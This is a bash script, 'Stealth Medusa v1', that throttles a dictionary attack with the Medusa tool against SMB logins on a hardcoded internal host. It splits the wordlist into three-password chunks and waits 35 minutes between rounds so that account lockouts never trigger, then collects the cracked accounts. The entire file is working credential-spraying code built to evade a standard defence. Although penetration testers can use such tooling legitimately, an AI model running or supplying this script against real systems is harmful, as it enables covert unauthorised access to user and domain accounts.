#!/bin/bash
#Stealth Medusa v1 by PTJ. This script splits a dictionary file you provide
#into specified chunks to be thrown at a machine. This allows you to test
#a large dictionary file without worrying about locking out everyone's
#account or babysitting it. All results are outputted to stealth_medusa.out


wordlist=passwordlist #dictionary file that contains the passwords to be tried, one per line
threshold=3           #how many passwords will be tried every round. 
timeout=35            #in minutes; time between the end of one round and start of the next
host='10.73.103.3'    #the host you will throw the chunks at
userfile=userlist     #list with usernames, one per line

#chop up dictionary file
split -l ${threshold} ${wordlist} ${wordlist}.dict

#iterate through and test everything
for i in $(ls -1 ${wordlist}.dict*); do
        date
        echo -e "####Testing the Passwords: \n$(cat $i)";
        medusa -h ${host} -U ${userfile} -P $i -M smbnt -m GROUP:DOMAIN >> stealth_medusa.out
        sleep ${timeout}m;
done

#pretty print
echo Valid Accounts:
grep "ACCOUNT FOUND" stealth_medusa.out

#cleanup the dict files
rm ${wordlist}.dict*
